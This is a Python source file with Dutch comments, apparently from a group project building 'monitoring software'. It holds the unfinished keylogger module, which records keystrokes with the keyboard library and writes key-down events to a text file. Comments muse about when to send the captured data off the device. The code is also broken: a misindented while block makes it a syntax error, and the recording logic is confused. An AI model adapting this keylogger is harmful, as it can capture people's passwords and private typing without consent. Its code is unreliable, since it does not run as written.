########################################################################################################################
#               Dit is het bestand voor de keystrokes en clipboard logger delen.                                       #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               De code in dit bestand wordt geïmporteerd naar monitorings_software.py.                                #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import keyboard as kb
import time

# Hieronder de relevante code


def main():
    """Tijdelijk de mogelijkheden van de kb library i.v.m. dat we nog niet weten hoe precies op te slaan.

    Args:
        template_naam (type): Korte uitleg

    Returns:
        type: korte uitleg

    Bronnen:
        https://github.com/boppreh/keyboard#keyboard.get_typed_strings ==> keyboard library
        https://www.thepythoncode.com/article/control-keyboard-python ==> template / ideeën voor keylogger code
    """

    # [~] kb.is_modifier(key) ==> geeft aan of meegegeven key modifier is.
    # [X] kb.send((hot)key(s)) ==> Voert hotkey(s) uit
    # [X] kb.add_hotkey("hotkeys", lambda: functie()) ==> voert functie uit wanneer hotkey activeert.
    # [X] kb.is_pressed('ctrl') ==> controleert op specifieke key, wrs onnodig
    # [X] kb.write("string", delay=0.0) ==> Print string (bij eindgebruiker, niet in .txt)
    # [V] kb.start_recording() en recording = kb.stop_recording()
    # [V] events = keyboard.record('esc') ==> opnemen keypresses
    # [X] keyboard.play(events) ==> opnieuw afspelen keypresses
    # [~] print(list(kb.get_typed_strings(events))) ==> Print geen hotkeys.
    # [X] kb.block_key(key) ==> blokkeert gebruik van key.
    # [X] kb.remap_key(src,dst) ==> src omzetten naar dst


    # IDEE: als app geopend ==> keyboard.record(hier op een of andere manier het openen als event/hotkey zetten)
    #       als app gesloten ==> print(list(kb.get_typed_strings(events))) maar ipv print naar txt schrijven
    #       Dit nog uitschrijven in woorden of op papier uittekenen/-schrijven.

    events_queue = kb.start_recording()  # Begin met opnemen aan het begin van het opstarten van programma.
    nieuwe_applicatie_geopend = True  # Tijdelijk i.v.m. gescheiden van Jaspers deel.
    computer_aan = True  # Wanneer data versturen? Als wachten tot apparaat uit, dan is het al te laat.
    # Rekening houden met wat als apparaat crashed? Wat als tussentijds op slaapstand / uit?


    while computer_aan:
        with open('keyboard_events_test.txt', 'w') as f:
            if nieuwe_applicatie_geopend:
                nieuwe_applicatie_geopend = False  # Tijdelijk i.v.m. gescheiden van Jaspers deel.



        press_events, release_events = events_queue
        kb.stop_recording()

            while not press_events.empty():
                event = press_events.get()
                if event.event_type == 'down':
                    f.write(str(event) + '\n')


if __name__ == '__main__':
    main()
